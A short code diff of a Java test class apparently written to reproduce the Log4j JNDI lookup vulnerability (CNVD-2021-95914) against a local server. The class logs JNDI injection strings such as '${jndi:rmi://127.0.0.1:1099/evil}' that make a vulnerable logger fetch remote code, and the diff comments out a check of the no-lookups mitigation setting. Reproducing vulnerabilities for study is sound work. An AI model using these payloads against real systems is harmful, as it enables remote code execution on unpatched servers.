@@ -12,7 +12,7 @@ public class log4j_CNVD_2021_95914 {
 //		log.error("xxxxxxx${jndi:ldap://127.0.0.1:1389/EvilObj}");
 		log.error("xxxxxxx${jndi:rmi://127.0.0.1:1099/evil}");
 
-		System.out.println(System.getProperty("log4j2.formatMsgNoLookups"));
+//		System.out.println(System.getProperty("log4j2.formatMsgNoLookups"));
 	}
 
 //	JndiManager.lookup() 最终执行到此
